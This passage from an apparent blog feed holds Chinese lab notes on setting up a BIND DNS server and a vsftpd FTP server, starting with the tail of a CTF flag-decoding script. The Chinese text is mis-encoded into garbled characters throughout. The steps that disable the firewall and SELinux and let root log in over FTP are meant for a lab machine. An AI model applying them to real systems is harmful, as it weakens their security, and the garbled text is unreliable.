class="hljs-number">885735</span>,<span class="hljs-number">2184813</span>,<span class="hljs-number">2165130</span>,<span class="hljs-number">1987983</span>,<span class="hljs-number">2460375</span>]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">51</span>) :    flag += chr(int(key[i] / <span class="hljs-number">19683</span>))print(flag)</code></pre></div><p>ç„¶åå°±æ‹¿åˆ°flagäº†ã€‚æ¯”èµ·å¾ˆå¤šå¤§å¸ˆå‚…çš„dumpæ ¸å¿ƒä»£ç ï¼Œå†è¿›è¡Œåˆ†æï¼Œå¯¹æˆ‘æ¥è¯´è¿˜æ˜¯å¤ªéš¾äº†ã€‚æ„Ÿè§‰åœ¨idaé‡Œåˆ°å…³é”®å¤„ï¼Œåˆ›å»ºå‡½æ•°ï¼Œç”Ÿæˆä¼ªä»£ç æ›´ç®€å•ï¼Œä¹Ÿå¾ˆæ¸…æ™°ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>RE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux- DNSæ­å»ºè®°å½•</title>
    <link href="/2020/03/11/linux_%20DNS%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/11/linux_%20DNS%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><p>å…¨ç§°ï¼š domain name system<br><img src="http://qiqianyun.chumen77.xyz/uPic/lHjkck.png" srcset="/img/loading.gif" alt></p><h2 id="åŸŸåæœåŠ¡åŸºç¡€"><a href="#åŸŸåæœåŠ¡åŸºç¡€" class="headerlink" title="åŸŸåæœåŠ¡åŸºç¡€"></a>åŸŸåæœåŠ¡åŸºç¡€</h2><h3 id="DNSä½œç”¨åŠç±»å‹"><a href="#DNSä½œç”¨åŠç±»å‹" class="headerlink" title="DNSä½œç”¨åŠç±»å‹"></a>DNSä½œç”¨åŠç±»å‹</h3><h4 id="DNS-ç³»ç»Ÿçš„ä½œç”¨-ï¼š"><a href="#DNS-ç³»ç»Ÿçš„ä½œç”¨-ï¼š" class="headerlink" title="DNS ç³»ç»Ÿçš„ä½œç”¨ ï¼š"></a>DNS ç³»ç»Ÿçš„ä½œç”¨ ï¼š</h4><ul><li>æ­£å‘è§£æï¼šæ ¹æ®ä¸»æœºåç§°ï¼ˆåŸŸåï¼‰æŸ¥æ‰¾å¯¹åº”çš„ IP åœ°å€ï¼ˆæœ€å¸¸è§ï¼‰</li><li>åå‘è§£æï¼šæ ¹æ® IP åœ°å€æŸ¥æ‰¾å¯¹åº”çš„ä¸»æœºåŸŸåï¼ˆé€šä¿¡è¡Œä¸šå¸¸ç”¨ï¼‰</li></ul><h4 id="DNS-ç³»ç»Ÿçš„å·¥ä½œæ¨¡å¼ï¼š"><a href="#DNS-ç³»ç»Ÿçš„å·¥ä½œæ¨¡å¼ï¼š" class="headerlink" title="DNS ç³»ç»Ÿçš„å·¥ä½œæ¨¡å¼ï¼š"></a>DNS ç³»ç»Ÿçš„å·¥ä½œæ¨¡å¼ï¼š</h4><ul><li>é€’å½’æŸ¥è¯¢ ï¼šè®¿é—®å¿…é¡»æœ‰ä¸€æ¬¡ä¸€å›ï¼Œä¼šè¿”å›æˆåŠŸæˆ–è€…å¤±è´¥ã€‚</li><li>è¿­ä»£æŸ¥è¯¢ ï¼šå¤šæ¬¡è®¿é—®ï¼Œå¤šæ¬¡è¿”å›ï¼Œå¿…é¡»è¿”å›ä¸€ä¸ªæ­£ç¡®çš„åœ°å€ã€‚<h4 id="åŸŸåç»“æ„ï¼š"><a href="#åŸŸåç»“æ„ï¼š" class="headerlink" title="åŸŸåç»“æ„ï¼š"></a>åŸŸåç»“æ„ï¼š</h4><img src="http://qiqianyun.chumen77.xyz/uPic/KgLSqJ.png" srcset="/img/loading.gif" alt><br>å…¨ä¸–ç•Œæœ‰13å°æ ¹åŸŸåæœåŠ¡å™¨ã€‚<h4 id="BINDè½¯ä»¶æœåŠ¡"><a href="#BINDè½¯ä»¶æœåŠ¡" class="headerlink" title="BINDè½¯ä»¶æœåŠ¡"></a>BINDè½¯ä»¶æœåŠ¡</h4></li></ul><div class="hljs"><pre><code class="hljs html">æœåŠ¡åï¼šnamed ç«¯å£å·ï¼š53ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/named.confä¿å­˜ DNS è§£æè®°å½•çš„æ•°æ®æ–‡ä»¶ä½äºï¼š/var/named/</code></pre></div><h4 id="ä¸»é…ç½®æ–‡ä»¶éƒ¨åˆ†å‚æ•°ï¼š"><a href="#ä¸»é…ç½®æ–‡ä»¶éƒ¨åˆ†å‚æ•°ï¼š" class="headerlink" title="ä¸»é…ç½®æ–‡ä»¶éƒ¨åˆ†å‚æ•°ï¼š"></a>ä¸»é…ç½®æ–‡ä»¶éƒ¨åˆ†å‚æ•°ï¼š</h4><div class="hljs"><pre><code class="hljs html">listen-on port 53 &#123; 127.0.0.1; &#125;; //è¦å¡«å…¥è‡ªå·±ä¸»æœºiplisten-on-v6 port 53 &#123; ::1; &#125;; allow-query     &#123; any; &#125;;//æ„æ€æ˜¯ç»™ä»»ä½•ç½‘æ®µè¿›è¡Œè§£æ</code></pre></div><p>åˆ†åˆ«æ˜¯: ipv4ç›‘å¬ç«¯å£å’Œipåœ°å€ï¼Œé»˜è®¤åªæœ‰æœ¬åœ°çš„<br>  ipv6çš„ç›‘å¬ç«¯å£å’Œipåœ°å€</p><div class="hljs"><pre><code class="hljs html">recursion yes; // é€’å½’è¿˜æ˜¯è¿­ä»£æŸ¥è¯¢dnssec-enable yes; dnssec-validation yes; dnssec-lookaside auto;</code></pre></div><p>è¿™ä¸ªæ˜¯dnsæ§åˆ¶é˜²æ­¢æ¬ºéª—ç”¨æˆ·ã€‚ä½†æ˜¯å› ä¸ºå…¶åŠ ä¸Šäº†åŒ…çš„éªŒè¯ï¼Œå†ä¼ ç»™æœåŠ¡å™¨æ—¶å€™ï¼ŒæœåŠ¡å™¨è¿›è¡Œæ‹†åŒ…éªŒè¯ï¼Œä¼šå¢åŠ æœåŠ¡å™¨çš„è´Ÿè·ï¼Œæ‰€ä»¥ç”¨çš„ä¸å¤šã€‚</p><h4 id="åŒºåŸŸæ–‡ä»¶éƒ¨åˆ†å‚æ•°ï¼š"><a href="#åŒºåŸŸæ–‡ä»¶éƒ¨åˆ†å‚æ•°ï¼š" class="headerlink" title="åŒºåŸŸæ–‡ä»¶éƒ¨åˆ†å‚æ•°ï¼š"></a>åŒºåŸŸæ–‡ä»¶éƒ¨åˆ†å‚æ•°ï¼š</h4><div class="hljs"><pre><code class="hljs html">    zone "baidu.com" IN &#123;      type master;      file "baidu.localhost"; //æœ¬æœºè®°å½•æ–‡ä»¶åç§°ï¼ˆå¯ä»¥diyï¼‰      allow-update &#123; none; &#125;;       &#125;;     //æ­£å‘    zone "131.140.168.192.in-addr.arpa" IN &#123;               type master;               file "baidu.empty";              allow-update &#123; none; &#125;;      &#125;;//åå‘//å¯¹äºå…¶ä¸­ file è‡ªå®šä¹‰çš„åå­—ï¼Œè¦ä¸æ•°æ®é…ç½®æ–‡ä»¶é‡Œé¢åå­—ç›¸åŒã€‚</code></pre></div><h2 id="å®éªŒæ­å»ºè¿‡ç¨‹"><a href="#å®éªŒæ­å»ºè¿‡ç¨‹" class="headerlink" title="å®éªŒæ­å»ºè¿‡ç¨‹"></a>å®éªŒæ­å»ºè¿‡ç¨‹</h2><p>è¦æ±‚ï¼šwwwä¸»æœºè§£æä¸º172.16.10.5ï¼›ftpä¸»æœºè§£æä¸º172.16.10.6ï¼šmailä¸»æœºè§£æä¸º172.16.10.8ï¼šDNSä¸»æœºè§£æä¸ºæœ¬æœºIP172.16.10.9ï¼›æ·»åŠ æ³›è§£æè®°å½•ï¼›åŒæ—¶æ·»åŠ wwwçš„åˆ«åè®°å½•ns1</p><h3 id="æœåŠ¡å™¨ä¸»æœº"><a href="#æœåŠ¡å™¨ä¸»æœº" class="headerlink" title="æœåŠ¡å™¨ä¸»æœº"></a>æœåŠ¡å™¨ä¸»æœº</h3><h4 id="å…³é—­é˜²ç«å¢™ã€SELinux"><a href="#å…³é—­é˜²ç«å¢™ã€SELinux" class="headerlink" title="å…³é—­é˜²ç«å¢™ã€SELinux"></a>å…³é—­é˜²ç«å¢™ã€SELinux</h4><div class="hljs"><pre><code class="hljs html">vi /etc/selinux/config</code></pre></div><p>æŠŠæ”¹æˆ SELINUX = disabled ç„¶å<code>setenforce 0</code></p><p><code>systemctl stop firewalld.service</code> å…³é—­é˜²ç«å¢™ã€‚</p><h4 id="é…ç½®ä¸»é…ç½®æ–‡ä»¶ï¼š"><a href="#é…ç½®ä¸»é…ç½®æ–‡ä»¶ï¼š" class="headerlink" title="é…ç½®ä¸»é…ç½®æ–‡ä»¶ï¼š"></a>é…ç½®ä¸»é…ç½®æ–‡ä»¶ï¼š</h4><div class="hljs"><pre><code class="hljs html">vi /etc/named.conf</code></pre></div><p>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/sgXisx.png" srcset="/img/loading.gif" alt><br>æ³¨æ„åˆ†å·ä¸è¦å¿˜è®°ï¼Œipå¡«çš„æ˜¯æœ¬æœºåœ°å€ã€‚</p><h4 id="é…ç½®åŒºåŸŸæ–‡ä»¶"><a href="#é…ç½®åŒºåŸŸæ–‡ä»¶" class="headerlink" title="é…ç½®åŒºåŸŸæ–‡ä»¶"></a>é…ç½®åŒºåŸŸæ–‡ä»¶</h4><div class="hljs"><pre><code class="hljs html">vi /etc/named.rfc1912.zones</code></pre></div><div class="hljs"><pre><code class="hljs html">zone "chumen77.com" IN &#123;        type master;        file "chumen77.localhost";        allow-update &#123; none; &#125;;&#125;;zone "10.16.172.in-addr.arpa" IN &#123;        type master;        file "chumen77.loopback";        allow-update &#123; none; &#125;;&#125;;</code></pre></div><ul><li>å…¶ä¸­æ³¨æ„åå‘è§£ææ—¶ï¼Œipåœ°å€çš„åå†™ï¼Œè¿˜æœ‰å†™åˆ°ipåœ°å€ç¬¬ä¸‰ä¸ªæ®µã€‚</li><li>å¹¶ä¸”æ­£å‘è§£æå’Œåå‘è§£æçš„æ–‡ä»¶åå­—è¦ç»™è®°ä½ï¼Œä¸€ä¼šéœ€è¦å»æŒ‰åç§°é…ç½®çš„ã€‚</li></ul><h4 id="é…ç½®æ­£å‘åå‘è§£ææ•°æ®æ–‡ä»¶"><a href="#é…ç½®æ­£å‘åå‘è§£ææ•°æ®æ–‡ä»¶" class="headerlink" title="é…ç½®æ­£å‘åå‘è§£ææ•°æ®æ–‡ä»¶"></a>é…ç½®æ­£å‘åå‘è§£ææ•°æ®æ–‡ä»¶</h4><div class="hljs"><pre><code class="hljs html">cp -p /var/named/named.localhost /var/named/chumen77.localhostcp -p /var/named/named.empty /var/named/chumen77.loopback</code></pre></div><ul><li>-p æ˜¯ç”¨æ¥å¤åˆ¶æ–‡ä»¶çš„æƒé™æƒ…å†µã€‚</li><li>æ¥æ‹·è´ä¸€ä¸‹ï¼Œæ–¹ä¾¿ç›´æ¥ä¿®æ”¹ã€‚</li></ul><p>æ­£å‘è§£ææ–‡ä»¶ ï¼š</p><div class="hljs"><pre><code class="hljs html">$TTL 1D@       IN SOA  chumen77.com. rname.invalid. (                                        0       ; serial                                        1D      ; refresh                                        1H      ; retry                                        1W      ; expire                                        3H )    ; minimum        NS      dns.chumen77.com.www     IN      A       172.16.10.5ftp     IN      A       172.16.10.6mail    IN      A       172.16.10.8dns     IN      A       172.16.10.131ns1     IN      CNAME   www*       IN      A       172.16.10.10</code></pre></div><p>åå‘è§£ææ–‡ä»¶ï¼š</p><div class="hljs"><pre><code class="hljs html">$TTL 3H@       IN SOA  chumen77.com. rname.invalid. (                                        0       ; serial                                        1D      ; refresh                                        1H      ; retry                                        1W      ; expire                                        3H )    ; minimum        NS      dns.chumen77.com.5       PTR     www.chumen77.com.6       PTR     ftp.chumen77.com.8       PTR     mail.chumen77.com.131     PTR     dns.chumen77.com.*       PTR     xxx.chumen77.com.</code></pre></div><p>æ³¨æ„æ¯ä¸ªç½‘å€åé¢è¦åŠ ä¸ªç‚¹ã€‚</p><h4 id="æ£€æŸ¥å’Œå¼€å¯"><a href="#æ£€æŸ¥å’Œå¼€å¯" class="headerlink" title="æ£€æŸ¥å’Œå¼€å¯"></a>æ£€æŸ¥å’Œå¼€å¯</h4><p><code>named-checkzone</code> å¯ä»¥å¯¹ä¸Šé¢4ä¸ªé…ç½®æ–‡ä»¶è¿›è¡Œè¯­æ³•é—®é¢˜çš„æ£€æŸ¥ï¼Œå‡ºç°okå°±æ˜¯æ²¡ä»€ä¹ˆé—®é¢˜äº†ã€‚</p><div class="hljs"><pre><code class="hljs html">systemctl start named</code></pre></div><p>å¼€å¯æœåŠ¡ï¼Œå¦‚æœå‡ºç°æ— æ³•å¼€å¯ï¼Œæœ‰å¼‚å¸¸ï¼š</p><div class="hljs"><pre><code class="hljs html">cat /var/log/messages</code></pre></div><p>ç”¨è¿™ä¸ªå‘½ä»¤å»æŸ¥é‚£ä¸ªé…ç½®æ–‡ä»¶é‡Œé¢çš„å†…å®¹å¡«é”™äº†ï¼Œç„¶åæ”¹ä¸€ä¸‹å°±okäº†ã€‚</p><h3 id="å®¢æˆ·æœºè®¾ç½®"><a href="#å®¢æˆ·æœºè®¾ç½®" class="headerlink" title="å®¢æˆ·æœºè®¾ç½®"></a>å®¢æˆ·æœºè®¾ç½®</h3><h4 id="ç½‘å¡è®¾ç½®"><a href="#ç½‘å¡è®¾ç½®" class="headerlink" title="ç½‘å¡è®¾ç½®"></a>ç½‘å¡è®¾ç½®</h4><div class="hljs"><pre><code class="hljs html">vi /etc/sysconfig/network-scripts/ifcfg-ens33</code></pre></div><p>ä¿®æ”¹ç½‘å¡ä¿¡æ¯ ï¼š</p><div class="hljs"><pre><code class="hljs html">DNS1=192.168.140.131</code></pre></div><p>è¦åœ¨æœ€ååŠ ä¸Šä½ dnsæœåŠ¡å™¨çš„ipã€‚æ³¨æ„æ˜¯ <code>DNS1</code>. è®¾ç½®å¥½åé‡å¯ç½‘å¡ã€‚</p><div class="hljs"><pre><code class="hljs html">service network restart</code></pre></div><h4 id="æµ‹é€Ÿæ˜¯å¦æˆåŠŸ"><a href="#æµ‹é€Ÿæ˜¯å¦æˆåŠŸ" class="headerlink" title="æµ‹é€Ÿæ˜¯å¦æˆåŠŸ"></a>æµ‹é€Ÿæ˜¯å¦æˆåŠŸ</h4><p>ä½¿ç”¨ä¸€ä¸‹ <code>nslookup</code><br><img src="http://qiqianyun.chumen77.xyz/uPic/MaK7Sw.png" srcset="/img/loading.gif" alt></p><p>æ­£å‘åå‘éƒ½æˆåŠŸäº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux\_ftpæœåŠ¡æ­å»ºè¸©å‘è®°å½•</title>
    <link href="/2020/03/11/linux_ftp%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/11/linux_ftp%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="linux-ftpæœåŠ¡æ­å»ºç®€å•è®°å½•"><a href="#linux-ftpæœåŠ¡æ­å»ºç®€å•è®°å½•" class="headerlink" title="linux_ftpæœåŠ¡æ­å»ºç®€å•è®°å½•_"></a>linux_ftpæœåŠ¡æ­å»ºç®€å•è®°å½•_</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç®€å•è®°å½•ä¸€ä¸‹ï¼Œftpçš„ç›¸å…³éœ€è¦è®°å½•çš„çŸ¥è¯†è·Ÿæ­å»ºæ‰€è¸©çš„å‘ã€‚</p><h2 id="ä¸¤ç§æœåŠ¡æ¨¡å¼"><a href="#ä¸¤ç§æœåŠ¡æ¨¡å¼" class="headerlink" title="ä¸¤ç§æœåŠ¡æ¨¡å¼"></a>ä¸¤ç§æœåŠ¡æ¨¡å¼</h2><ul><li>ä¸»åŠ¨æ¨¡å¼ï¼šFTPæœåŠ¡å™¨ä¸»åŠ¨å‘å®¢æˆ·ç«¯å‘èµ·è¿æ¥è¯·æ±‚ã€‚</li><li>è¢«åŠ¨æ¨¡å¼ï¼šFTPæœåŠ¡å™¨ç­‰å¾…å®¢æˆ·ç«¯å‘èµ·è¿æ¥è¯·æ±‚ï¼ˆFTPçš„é»˜è®¤å·¥ä½œæ¨¡å¼ï¼‰ã€‚<h2 id="vsftpdæœåŠ¡ç¨‹åº"><a href="#vsftpdæœåŠ¡ç¨‹åº" class="headerlink" title="vsftpdæœåŠ¡ç¨‹åº"></a>vsftpdæœåŠ¡ç¨‹åº</h2>ftpæ˜¯Linuxç³»ç»Ÿä¸­ä»¥å‘½ä»¤è¡Œç•Œé¢çš„æ–¹å¼æ¥ç®¡ç†FTPä¼ è¾“æœåŠ¡çš„å®¢æˆ·ç«¯å·¥å…·ã€‚æˆ‘ä»¬é¦–å…ˆæ‰‹åŠ¨å®‰è£…è¿™ä¸ªftpå®¢æˆ·ç«¯å·¥å…·ï¼Œä»¥ä¾¿åœ¨åç»­å®éªŒä¸­æŸ¥çœ‹ç»“æœã€‚<br>vsftpdä½œä¸ºæ›´åŠ å®‰å…¨çš„æ–‡ä»¶ä¼ è¾“çš„æœåŠ¡ç¨‹åºï¼Œå…è®¸ç”¨æˆ·ä»¥<strong>ä¸‰ç§è®¤è¯æ¨¡å¼</strong>ç™»å½•åˆ°FTPæœåŠ¡å™¨ä¸Šã€‚</li><li><strong>åŒ¿åå¼€æ”¾æ¨¡å¼</strong>ï¼šæ˜¯ä¸€ç§æœ€ä¸å®‰å…¨çš„è®¤è¯æ¨¡å¼ï¼Œä»»ä½•äººéƒ½å¯ä»¥æ— éœ€å¯†ç éªŒè¯è€Œç›´æ¥ç™»å½•åˆ°FTPæœåŠ¡å™¨ã€‚</li><li><strong>æœ¬åœ°ç”¨æˆ·æ¨¡å¼</strong>ï¼šæ˜¯é€šè¿‡<strong>Linuxç³»ç»Ÿæœ¬åœ°çš„è´¦æˆ·å¯†ç </strong>ä¿¡æ¯è¿›è¡Œè®¤è¯çš„æ¨¡å¼ï¼Œç›¸è¾ƒäºåŒ¿åå¼€æ”¾æ¨¡å¼æ›´å®‰å…¨ï¼Œè€Œä¸”é…ç½®èµ·æ¥ä¹Ÿå¾ˆç®€å•ã€‚ä½†æ˜¯å¦‚æœè¢«é»‘å®¢ç ´è§£äº†è´¦æˆ·çš„ä¿¡æ¯ï¼Œå°±å¯ä»¥ç•…é€šæ— é˜»åœ°ç™»å½•FTPæœåŠ¡å™¨ï¼Œä»è€Œå®Œå…¨æ§åˆ¶æ•´å°æœåŠ¡å™¨ã€‚</li><li><strong>è™šæ‹Ÿç”¨æˆ·æ¨¡å¼</strong>ï¼šæ˜¯è¿™ä¸‰ç§æ¨¡å¼ä¸­æœ€å®‰å…¨çš„ä¸€ç§è®¤è¯æ¨¡å¼ï¼Œå®ƒéœ€è¦ä¸ºFTPæœåŠ¡å•ç‹¬å»ºç«‹ç”¨æˆ·æ•°æ®åº“æ–‡ä»¶ï¼Œè™šæ‹Ÿå‡ºç”¨æ¥è¿›è¡Œå£ä»¤éªŒè¯çš„è´¦æˆ·ä¿¡æ¯ï¼Œè€Œè¿™äº›è´¦æˆ·ä¿¡æ¯åœ¨æœåŠ¡å™¨ç³»ç»Ÿä¸­å®é™…ä¸Šæ˜¯ä¸å­˜åœ¨çš„ï¼Œä»…ä¾›FTPæœåŠ¡ç¨‹åºè¿›è¡Œè®¤è¯ä½¿ç”¨ã€‚è¿™æ ·ï¼Œå³ä½¿é»‘å®¢ç ´è§£äº†è´¦æˆ·ä¿¡æ¯ä¹Ÿæ— æ³•ç™»å½•æœåŠ¡å™¨ï¼Œä»è€Œæœ‰æ•ˆé™ä½äº†ç ´åèŒƒå›´å’Œå½±å“ã€‚<h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><div class="hljs"><pre><code class="hljs html">yum -y install vsftpd</code></pre></div></li></ul><h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><p>ä¸»é…ç½®æ–‡ä»¶è·¯å¾„ ï¼š</p><div class="hljs"><pre><code class="hljs html">/etc/vsftpd/vsftpd.conf</code></pre></div><p>å¸¸ç”¨çš„é…ç½®å‚æ•°ä»¥åŠä½œç”¨å¦‚ä¸‹ï¼š</p><div class="hljs"><pre><code class="hljs html">å‚æ•°                                ä½œç”¨listen=[YES|NO]              æ˜¯å¦ä»¥ç‹¬ç«‹è¿è¡Œçš„æ–¹å¼ç›‘å¬æœåŠ¡listen_address=IPåœ°å€        è®¾ç½®è¦ç›‘å¬çš„IPåœ°å€listen_port=21               è®¾ç½®FTPæœåŠ¡çš„ç›‘å¬ç«¯å£download_enableï¼[YES|NO]    æ˜¯å¦å…è®¸ä¸‹è½½æ–‡ä»¶userlist_enable=[YES|NO]     è®¾ç½®ç”¨æˆ·åˆ—è¡¨ä¸ºâ€œå…è®¸â€è¿˜æ˜¯â€œç¦æ­¢â€æ“ä½œuserlist_deny=[YES|NO]      è®¾ç½®ç”¨æˆ·åˆ—è¡¨ä¸ºâ€œå…è®¸â€è¿˜æ˜¯â€œç¦æ­¢â€æ“ä½œmax_clients=0                æœ€å¤§å®¢æˆ·ç«¯è¿æ¥æ•°ï¼Œ0ä¸ºä¸é™åˆ¶max_per_ip=0                 åŒä¸€IPåœ°å€çš„æœ€å¤§è¿æ¥æ•°ï¼Œ0ä¸ºä¸é™åˆ¶anonymous_enable=[YES|NO]    æ˜¯å¦å…è®¸åŒ¿åç”¨æˆ·è®¿é—®anon_upload_enable=[YES|NO]  æ˜¯å¦å…è®¸åŒ¿åç”¨æˆ·ä¸Šä¼ æ–‡ä»¶anon_umask=022               åŒ¿åç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„umaskå€¼anon_root=/var/ftp           åŒ¿åç”¨æˆ·çš„FTPæ ¹ç›®å½•anon_mkdir_write_enable=[YES|NO]    æ˜¯å¦å…è®¸åŒ¿åç”¨æˆ·åˆ›å»ºç›®å½•anon_other_write_enable=[YES|NO]    æ˜¯å¦å¼€æ”¾åŒ¿åç”¨æˆ·çš„å…¶ä»–å†™å…¥æƒé™ï¼ˆåŒ…æ‹¬é‡å‘½åã€åˆ é™¤ç­‰æ“ä½œæƒé™ï¼‰anon_max_rate=0               åŒ¿åç”¨æˆ·çš„æœ€å¤§ä¼ è¾“é€Ÿç‡ï¼ˆå­—èŠ‚/ç§’ï¼‰ï¼Œ0ä¸ºä¸é™åˆ¶local_enable=[YES|NO]         æ˜¯å¦å…è®¸æœ¬åœ°ç”¨æˆ·ç™»å½•FTPlocal_umask=022                æœ¬åœ°ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„umaskå€¼local_root=/var/ftp            æœ¬åœ°ç”¨æˆ·çš„FTPæ ¹ç›®å½•chroot_local_user=[YES|NO]    æ˜¯å¦å°†ç”¨æˆ·æƒé™ç¦é”¢åœ¨FTPç›®å½•ï¼Œä»¥ç¡®ä¿å®‰å…¨local_max_rate=0              æœ¬åœ°ç”¨æˆ·æœ€å¤§ä¼ è¾“é€Ÿç‡ï¼ˆå­—èŠ‚/ç§’ï¼‰ï¼Œ0ä¸ºä¸é™åˆ¶</code></pre></div><p>åœ¨é…ç½®ç€çš„æ—¶å€™ï¼Œæ³¨æ„å¯¹åœ¨è¿™é‡Œå¯¹åº”èµ·æ¥ï¼Œæ¥æ§åˆ¶åŒ¿åæ¨¡å¼è·Ÿæœ¬åœ°ç”¨æˆ·çš„éƒ¨åˆ†æƒé™ã€‚</p><h3 id="å¼€å¯vsftpdæœåŠ¡"><a href="#å¼€å¯vsftpdæœåŠ¡" class="headerlink" title="å¼€å¯vsftpdæœåŠ¡"></a>å¼€å¯vsftpdæœåŠ¡</h3><div class="hljs"><pre><code class="hljs html">service vsftpd start  systemctl start vsftpd</code></pre></div><h2 id="è¸©å‘è®°å½•"><a href="#è¸©å‘è®°å½•" class="headerlink" title="è¸©å‘è®°å½•"></a>è¸©å‘è®°å½•</h2><h3 id="0x1-ï¼š"><a href="#0x1-ï¼š" class="headerlink" title="0x1 ï¼š"></a>0x1 ï¼š</h3><p>å› ä¸ºæ˜¯å®éªŒæœºï¼Œéšä¾¿æŠ˜è…¾ï¼Œä¸ºäº†å®éªŒçš„æˆåŠŸï¼Œéœ€è¦<strong>å…³é—­é˜²ç«å¢™</strong> å’Œ<strong>SELinuxæœåŠ¡</strong>ã€‚</p><h4 id="é˜²ç«å¢™ï¼š"><a href="#é˜²ç«å¢™ï¼š" class="headerlink" title="é˜²ç«å¢™ï¼š"></a>é˜²ç«å¢™ï¼š</h4><p>CentOS7.0ç‰ˆæœ¬çš„linuxç³»ç»Ÿçš„é˜²ç«å¢™æ˜¯firewalldï¼Œå…¶ä»–ç‰ˆæœ¬çš„å¯èƒ½æ˜¯iptablesã€‚<br>firewalldé˜²ç«å¢™å…³é—­ä»£ç ï¼š</p><div class="hljs"><pre><code class="hljs html">å…³é—­é˜²ç«å¢™systemctl stop firewalld.serviceæ°¸ä¹…ç¦æ­¢é˜²ç«å¢™ systemctl disable firewalld.serviceæ£€æŸ¥é˜²ç«å¢™çŠ¶æ€ systemctl status firewalld.serviceæç¤ºï¼šActive: inactive (dead)å°±è¡¨ç¤ºå…³é—­äº†ã€‚</code></pre></div><p>iptablesé˜²ç«å¢™å…³é—­ä»£ç  ï¼š</p><div class="hljs"><pre><code class="hljs html">æŸ¥è¯¢é˜²ç«å¢™çŠ¶æ€    :    service  iptables statusåœæ­¢é˜²ç«å¢™   :        service   iptables stopå¯åŠ¨é˜²ç«å¢™   :        service   iptables starté‡å¯é˜²ç«å¢™   :        service   iptables restartæ°¸ä¹…å…³é—­é˜²ç«å¢™    : chkconfig   iptables offæ°¸ä¹…å…³é—­åå¯ç”¨    :   chkconfig   iptables on</code></pre></div><h4 id="SELinuxæœåŠ¡ï¼š"><a href="#SELinuxæœåŠ¡ï¼š" class="headerlink" title="SELinuxæœåŠ¡ï¼š"></a>SELinuxæœåŠ¡ï¼š</h4><p><code>setsebool -P ftpd_full_access=on</code>å•ç‹¬å¤„ç†ftpdã€‚</p><p>æˆ–ï¼šå…³é—­SELinux</p><div class="hljs"><pre><code class="hljs html">$ vi /etc/selinux/config</code></pre></div><p>å°† SELINUX=XXX â€“&gt;XXX ä»£è¡¨çº§åˆ«<br>æ”¹ä¸º** SELINUX=disabled**<br>ç„¶åé‡å¯ç³»ç»Ÿï¼Œæˆ–è€…æ‰§è¡Œå‘½ä»¤ï¼š<code>setenforce 0</code>ã€‚</p><h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2:"></a>0x2:</h3><p>å‘ç°åŒ¿åç”¨æˆ·ï¼Œåœ¨è¿ä¸ŠftpæœåŠ¡å™¨æ—¶å€™ï¼Œæ— æ³•è¿›è¡Œå†™å…¥ä¸œè¥¿ã€‚</p><div class="hljs"><pre><code class="hljs html">550 Permission denied.</code></pre></div><p>ç„¶åè¿™ä¸ªç›®å½•æ˜¯:</p><div class="hljs"><pre><code class="hljs html">/var/ftp/pub</code></pre></div><p>è¿™å°±æ˜¯æŠŠè¿™ä¸ªpubçš„å±ä¸»æ§åˆ¶ä¸º æ§åˆ¶ä¸ºftpå³å¯ã€‚</p><div class="hljs"><pre><code class="hljs html">chown ftp pub</code></pre></div><p>è¿™æ ·å°±å¯ä»¥äº†ã€‚</p><h3 id="0x3"><a href="#0x3" class="headerlink" title="0x3:"></a>0x3:</h3><p>åœ¨æœ¬åœ°ç”¨æˆ·çš„æ—¶å€™ï¼Œç”¨rootä¹Ÿæ˜¯æ— æ³•è¿æ¥ftpæœåŠ¡çš„ã€‚è¿™æ˜¯å› ä¸ºvsftpdæœåŠ¡ç¨‹åºæ‰€åœ¨çš„ç›®å½•ä¸­é»˜è®¤å­˜æ”¾ç€ä¸¤ä¸ªåä¸ºâ€œç”¨æˆ·åå•â€çš„æ–‡ä»¶ï¼ˆ<code>ftpuserså’Œuser_list</code>ï¼‰æŠŠftpusersè¿™é‡Œé¢çš„rootå»æ‰å³å¯ã€‚</p><h3 id="0x4"><a href="#0x4" class="headerlink" title="0x4:"></a>0x4:</h3><ul><li>åœ¨é‡‡ç”¨æœ¬åœ°ç”¨æˆ·æ¨¡å¼ç™»å½•FTPæœåŠ¡å™¨åï¼Œé»˜è®¤è®¿é—®çš„æ˜¯è¯¥ç”¨æˆ·çš„å®¶ç›®å½•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè®¿é—®çš„æ˜¯/home/linuxprobeç›®å½•(ç³»ç»Ÿåˆ›å»ºçš„ç”¨æˆ·ï¼Œåœ¨homeæ–‡ä»¶å¤¹ä¸‹éƒ½æœ‰å¯¹åº”ç”¨æˆ·åçš„æ–‡ä»¶å¤¹)ã€‚è€Œä¸”è¯¥ç›®å½•çš„é»˜è®¤æ‰€æœ‰è€…ã€æ‰€å±ç»„éƒ½æ˜¯è¯¥ç”¨æˆ·è‡ªå·±ï¼Œå› 